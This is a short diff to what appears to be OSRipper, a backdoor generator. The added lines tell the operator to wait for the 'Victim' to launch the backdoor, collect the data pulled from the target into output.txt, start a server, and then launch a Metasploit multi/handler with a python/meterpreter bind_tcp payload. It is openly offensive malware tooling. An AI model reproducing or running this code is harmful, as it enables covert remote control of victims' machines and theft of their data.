@@ -555,6 +555,12 @@ if nscan == "1":
     postgen()
     rep_syst()
     cleanup()
+    os.system('clear')
+    print('Generated in dist')
+    print('OSRipper will now wait for the Victim to launch the Backdoor. As soon as they do you will see a file called output.txt with all the data that has been pulled of the target')
+    print('After that the listener will spawn instantly')
+    server()
+    port=input('Please enter the port you want to listen on: ')
     a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/bind_tcp;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
     os.system(a)
 if nscan == "2":
